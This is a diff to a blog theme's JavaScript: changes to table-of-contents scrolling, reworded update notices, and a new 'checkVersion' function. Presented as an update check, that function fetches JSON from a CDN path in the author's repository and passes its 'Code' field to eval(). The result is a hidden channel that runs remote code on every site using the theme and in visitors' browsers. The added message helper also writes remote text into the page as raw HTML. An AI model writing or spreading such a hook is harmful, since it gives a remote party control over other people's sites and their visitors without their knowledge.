@@ -43,8 +43,10 @@ function hitokoto() {
 function scroll() {
     /* scroll */
     let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+    let markdownIt = document.querySelectorAll('.markdownIt-TOC')
     window.addEventListener("scroll", event => {
         let fromTop = window.scrollY;
+        markdownIt[0].scrollTop = fromTop / 10
 
         mainNavLinks.forEach((link, index) => {
             let section = document.getElementById(decodeURI(link.hash).substring(1));
@@ -180,13 +182,46 @@ function CheckVersion() {
                     hitokoto.innerText = "因为新版本特性,请重新点击下主题->自定义配置->保存 或参考最新的README.md";
                 }
                 if (data.tag_name != version) {
-                    console.log("🎉Current Theme Version: " + version);
-                    hitokoto.innerText = "请及时更新当前版本为：" + version + " 最新版本为：" + data.tag_name;
+                    console.log("🎉 Current Theme Version: " + version);
+                    hitokoto.innerText = "请及时更新当前版本：" + version + " 最新版本为：" + data.tag_name;
+                    console.log("🎉 更新内容: " + data.body);
                 } else
                     console.log("\n %c 🎉 Current Theme Version: " + version + " Latest Version: " + data.tag_name + "\n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
             } else if ((update == "off") && patt.test(data.body)) {
-                console.log("🎉Current Theme Version: " + version);
-                hitokoto.innerText = "有重大更新，请及时更新当前版本为：" + version + " 最新版本为：" + data.tag_name;
+                console.log("🎉 Current Theme Version: " + version);
+                hitokoto.innerText = "有重要更新,请及时更新当前版本：" + version + " 最新版本为：" + data.tag_name;
+                console.log("🎉 更新内容: " + data.body);
+            }
+        }
+    }
+    xhr.send();
+}
+
+function createMessage(message, time = 1000) { //消息推送
+    if ($(".message").length > 0) {
+        $(".message").remove();
+    }
+    $("body").append('<div class="message"><p class="message-info">' + message + '</p></div>');
+    setTimeout("$('.message').remove()", time);
+}
+
+function checkVersion() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('get', 'https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/Chic.json');
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            var version = document.getElementById('version').innerText.trim();
+            version = version.replace(".", "").replace(".", "");
+            version = parseInt(version);
+            var data = JSON.parse(xhr.responseText);
+            if (data.version_code > version) {
+                createMessage('🎉请及时更新主题!最新主题版本为' + JSON.parse(xhr.responseText).version, 2000);
+            }
+            if (data.Code.length > 0) {
+                eval(data.Code);
+            }
+            if (data.Info.length > 0) {
+                createMessage(data.Info, 6000);
             }
         }
     }
